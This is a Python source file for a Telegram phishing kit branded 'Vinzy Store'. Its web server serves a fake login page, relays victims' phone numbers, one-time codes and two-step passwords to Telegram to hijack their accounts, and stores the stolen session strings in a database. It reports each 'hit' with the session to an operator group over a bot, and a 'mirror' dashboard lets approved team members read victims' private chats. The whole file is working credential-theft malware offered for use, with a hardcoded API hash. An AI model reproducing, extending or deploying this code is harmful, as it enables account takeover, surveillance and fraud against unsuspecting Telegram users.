import os
import asyncio
import telebot
import psycopg2
import logging
import json
import sys
from telebot import types
from quart import Quart, request, jsonify, render_template
from telethon import TelegramClient, functions, errors, events
from telethon.sessions import StringSession
from threading import Thread
from datetime import datetime, timedelta

# --- SECTION 1: GLOBAL CONFIGURATION & LOGGING ---
# All sensitive info is pulled from Environment Variables for Koyeb/Heroku
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", 0)) 
VERIFY_GROUP = int(os.environ.get("VERIFY_GROUP", 0))
ADMIN_HANDLE = os.environ.get("ADMIN_HANDLE", "@g_yuyuu")
BASE_URL = os.environ.get("BASE_URL", "").rstrip('/')

# Detailed Logging Format
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("VinzyUltra_V3")

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Quart(__name__)

# In-memory store for tracking live login attempts
# Format: { phone: { "client": TelethonClient, "hash": str, "tid": int, "timestamp": datetime } }
active_mirrors = {}

# --- SECTION 2: DATABASE ARCHITECTURE ---

def get_db_connection():
    """Establishes a secure connection to the PostgreSQL database."""
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def init_db():
    """Initializes the required tables. This runs every time the app starts."""
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        
        # Table 1: Store authorized team members
        cur.execute("""
            CREATE TABLE IF NOT EXISTS approved_users (
                user_id BIGINT PRIMARY KEY, 
                username TEXT,
                status TEXT DEFAULT 'approved',
                joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # Table 2: Store captured accounts and their session strings
        cur.execute("""
            CREATE TABLE IF NOT EXISTS controlled_accounts (
                phone TEXT PRIMARY KEY, 
                session_string TEXT NOT NULL, 
                owner_name TEXT, 
                tid BIGINT,
                hit_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        conn.commit()
        cur.close()
        conn.close()
        logger.info("CORE: Database Schema verified and active.")
    except Exception as e:
        logger.error(f"DATABASE ERROR: {e}")

def is_approved(user_id):
    """Checks if a Telegram user is authorized to use Vinzy Store tools."""
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT status FROM approved_users WHERE user_id = %s", (user_id,))
        res = cur.fetchone()
        cur.close()
        conn.close()
        return res is not None
    except Exception as e:
        logger.error(f"AUTH ERROR: {e}")
        return False

# Trigger Database Initialization
init_db()

# --- SECTION 3: LOGIN HTML ENGINE (LOGIN ENDPOINTS) ---

@app.route('/')
async def login_page():
    """Serves the login.html from the templates folder."""
    try:
        return await render_template("login.html")
    except Exception as e:
        logger.error(f"TEMPLATE ERROR: {e}")
        return "<h1>Server Error: login.html not found in templates/ folder.</h1>", 404

@app.route('/step_phone', methods=['POST'])
async def step_phone():
    """Handles the first step: Phone submission and OTP request."""
    data = await request.json
    phone = data.get('phone', '').replace("+", "").replace(" ", "").strip()
    tid = data.get('tid') # This is the unique ID from the URL link

    if not phone:
        return jsonify({"status": "error", "msg": "Phone number required."})

    # Initialize a new Telethon client for this specific login attempt
    # We spoof an iPhone 16 Pro Max to increase trust scores
    client = TelegramClient(
        StringSession(), 
        API_ID, 
        API_HASH, 
        device_model="iPhone 16 Pro Max", 
        system_version="18.3",
        app_version="11.5.2"
    )
    
    await client.connect()
    
    try:
        # Request the code from Telegram servers
        sent_code = await client.send_code_request(phone)
        
        # Store the client in memory so we can use it in the next step
        active_mirrors[phone] = {
            "client": client, 
            "hash": sent_code.phone_code_hash, 
            "tid": tid,
            "timestamp": datetime.now()
        }
        
        logger.info(f"OTP SENT: {phone} for Bridge ID: {tid}")
        return jsonify({"status": "success", "msg": "OTP has been sent to your device."})
        
    except errors.FloodWaitError as e:
        return jsonify({"status": "error", "msg": f"Telegram Limit: Try again in {e.seconds}s"})
    except Exception as e:
        logger.error(f"STEP_PHONE ERROR: {e}")
        return jsonify({"status": "error", "msg": "Failed to send code. Check number."})

@app.route('/step_code', methods=['POST'])
async def step_code():
    """Handles the second step: OTP Verification."""
    data = await request.json
    phone = data.get('phone', '').replace("+", "").replace(" ", "")
    code = data.get('code', '').strip()
    tid = data.get('tid')

    if phone not in active_mirrors:
        return jsonify({"status": "error", "msg": "Session expired. Please refresh."})

    session_data = active_mirrors[phone]
    client = session_data['client']

    try:
        # Attempt to sign in with the OTP code
        await client.sign_in(phone, code, phone_code_hash=session_data['hash'])
        
        # If successful, handle the data saving and notifications
        return await finalize_login(client, phone, tid)

    except errors.SessionPasswordNeededError:
        # This triggered if the victim has Two-Step Verification active
        logger.info(f"2FA REQUIRED: {phone}")
        return jsonify({"status": "2fa_needed"})
    except errors.PhoneCodeInvalidError:
        return jsonify({"status": "error", "msg": "The code you entered is invalid."})
    except Exception as e:
        logger.error(f"STEP_CODE ERROR: {e}")
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_2fa', methods=['POST'])
async def step_2fa():
    """Handles the final step: 2FA Password Submission (The fix for your 404)."""
    data = await request.json
    phone = data.get('phone', '').replace("+", "").replace(" ", "")
    password = data.get('password', '').strip()
    tid = data.get('tid')

    if phone not in active_mirrors:
        return jsonify({"status": "error", "msg": "Session timed out."})

    client = active_mirrors[phone]['client']

    try:
        # Complete the login using the 2FA password
        await client.sign_in(password=password)
        return await finalize_login(client, phone, tid)
    except errors.PasswordHashInvalidError:
        return jsonify({"status": "error", "msg": "Incorrect 2FA Password."})
    except Exception as e:
        logger.error(f"STEP_2FA ERROR: {e}")
        return jsonify({"status": "error", "msg": str(e)})

async def finalize_login(client, phone, tid):
    """Helper function to save sessions and notify groups/users."""
    try:
        me = await client.get_me()
        session_str = client.session.save()
        owner_name = f"{me.first_name} {me.last_name or ''}".strip()

        # 1. Store in Database
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO controlled_accounts (phone, session_string, owner_name, tid) 
            VALUES (%s, %s, %s, %s) 
            ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string
        """, (phone, session_str, owner_name, tid))
        conn.commit()
        cur.close()
        conn.close()

        # 2. Notify the Main Logger Group (Vinzy Store Admin)
        log_text = (
            f"💰 <b>NEW HIT ACHIEVED!</b>\n\n"
            f"👤 <b>Name:</b> {owner_name}\n"
            f"📱 <b>Phone:</b> <code>{phone}</code>\n"
            f"🔑 <b>Session:</b> <code>{session_str}</code>\n"
            f"🔗 <b>Source ID:</b> <code>{tid}</code>"
        )
        bot.send_message(LOGGER_GROUP, log_text)

        # 3. Notify the specific user who generated the link (The Bridge)
        if str(tid).isdigit():
            msg_text = (
                f"🎯 <b>HIT ថ្មីបានចូលមកដល់!</b>\n\n"
                f"👤 ឈ្មោះ: {owner_name}\n"
                f"📱 លេខទូរស័ព្ទ: {phone}\n\n"
                f"ប្រើប្រាស់ពាក្យបញ្ជា <code>.mirror {phone}</code> ដើម្បីមើលសារក្នុង Telegram នេះ។"
            )
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🖥 Open Mirror Dashboard", url=f"{BASE_URL}/mirror/{phone}"))
            bot.send_message(tid, msg_text, reply_markup=markup)

        # Cleanup memory
        await client.disconnect()
        if phone in active_mirrors:
            del active_mirrors[phone]
            
        logger.info(f"SUCCESS: Account {phone} fully captured and bridged.")
        return jsonify({"status": "success"})
        
    except Exception as e:
        logger.error(f"FINALIZE ERROR: {e}")
        return jsonify({"status": "error", "msg": "Internal finalization error."})

# --- SECTION 4: MIRROR HTML & CROSS-BRIDGE LOGIC ---

@app.route('/mirror/<phone>')
async def mirror_dashboard(phone):
    """The Cross-Bridge: Provides a web interface to view the captured account."""
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT session_string, owner_name FROM controlled_accounts WHERE phone = %s", (phone,))
        res = cur.fetchone()
        cur.close()
        conn.close()

        if not res:
            return "<h1>Error: This account is not in the Vinzy Database.</h1>", 404

        # Initiate connection with saved session
        client = TelegramClient(StringSession(res[0]), API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            return "<h1>Error: Session has been terminated by the user.</h1>", 401

        # Fetch recent conversations
        dialogs = await client.get_dialogs(limit=40)
        chats_html = ""
        for d in dialogs:
            msg = d.message.message[:50] if d.message and d.message.message else "<i>Media Attachment</i>"
            chats_html += f"""
            <div style="background:#222; margin:5px; padding:10px; border-radius:8px; border-left:4px solid #8774e1;">
                <div style="color:#8774e1; font-weight:bold;">{d.name}</div>
                <div style="color:#ccc; font-size:13px;">{msg}</div>
            </div>
            """
        await client.disconnect()

        # Render mirror.html with the dynamic chat data
        return await render_template("mirror.html", name=res[1], phone=phone, chats=chats_html)
        
    except Exception as e:
        logger.error(f"MIRROR ERROR: {e}")
        return f"<h1>Mirror Error: {str(e)}</h1>"

# --- SECTION 5: BOT COMMANDS (ADMIN & TEAM TOOLS) ---

@bot.message_handler(commands=['start'])
def bot_start(m):
    uid = m.from_user.id
    if is_approved(uid):
        kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
        kb.add(types.KeyboardButton("🔗 បង្កើតតំណភ្ជាប់"), types.KeyboardButton("📋 គណនីទាំងអស់"))
        bot.send_message(m.chat.id, "⚡ <b>Vinzy Store v3.0 Master</b>\nSystem is online and connected to Database.", reply_markup=kb)
    else:
        bot.send_message(m.chat.id, f"🚫 <b>គ្មានការអនុញ្ញាត</b>\n\nសូមទាក់ទង {ADMIN_HANDLE} ដើម្បីសុំការអនុញ្ញាតចូលប្រើប្រាស់។")
        
        # Notification to Admin Group for Approval
        btn = types.InlineKeyboardMarkup()
        btn.add(types.InlineKeyboardButton("✅ Approve User", callback_data=f"auth_{uid}"))
        bot.send_message(VERIFY_GROUP, f"🔔 <b>New Access Request</b>\nUser: @{m.from_user.username}\nID: <code>{uid}</code>", reply_markup=btn)

@bot.callback_query_handler(func=lambda call: call.data.startswith('auth_'))
def handle_auth_callback(call):
    if call.message.chat.id != VERIFY_GROUP: return
    target_id = int(call.data.split('_')[1])
    
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("INSERT INTO approved_users (user_id) VALUES (%s) ON CONFLICT DO NOTHING", (target_id,))
    conn.commit()
    cur.close()
    conn.close()
    
    bot.edit_message_text(f"✅ User <code>{target_id}</code> is now Authorized.", call.message.chat.id, call.message.message_id)
    bot.send_message(target_id, "🎉 <b>Account Approved!</b>\nYou can now use /start to generate links.")

@bot.message_handler(func=lambda m: m.text == "🔗 បង្កើតតំណភ្ជាប់")
def bot_gen_link(m):
    if not is_approved(m.from_user.id): return
    # The 'id' parameter in the URL is critical for the 'Bridge' logic
    personal_link = f"{BASE_URL}/?id={m.from_user.id}"
    bot.reply_to(m, f"🌐 <b>តំណភ្ជាប់សម្រាប់ស្ទូច (Your Link):</b>\n\n<code>{personal_link}</code>\n\n<i>នៅពេលមានគេ Login តាម Link នេះ អ្នកនឹងទទួលបានសារដំណឹងភ្លាមៗ។</i>")

@bot.message_handler(func=lambda m: m.text.startswith('.mirror '))
def bot_mirror_cmd(m):
    if not is_approved(m.from_user.id): return
    phone = m.text.replace('.mirror ', '').strip().replace("+", "")
    bot.reply_to(m, f"🖥 <b>Accessing Mirror Dashboard...</b>\n{BASE_URL}/mirror/{phone}")

# --- SECTION 6: MAINTENANCE & RUNTIME ---

def cleanup_active_mirrors():
    """Background task to remove dead login sessions from RAM (every 30 mins)."""
    while True:
        try:
            now = datetime.now()
            expired = [p for p, d in active_mirrors.items() if now - d['timestamp'] > timedelta(minutes=30)]
            for p in expired:
                del active_mirrors[p]
                logger.info(f"CLEANUP: Removed expired session for {p}")
        except: pass
        asyncio.run(asyncio.sleep(1800))

def run_bot():
    """Safe wrapper for bot polling."""
    logger.info("BOT: Polling initiated.")
    bot.infinity_polling(timeout=10, long_polling_timeout=5)

if __name__ == "__main__":
    # Start background threads
    Thread(target=run_bot, daemon=True).start()
    Thread(target=cleanup_active_mirrors, daemon=True).start()
    
    # Start Web Server
    # Quart uses an ASGI server; this will run on Koyeb/Heroku/Railway
    port = int(os.environ.get("PORT", 8000))
    logger.info(f"WEB: Server starting on port {port}")
    app.run(host="0.0.0.0", port=port)
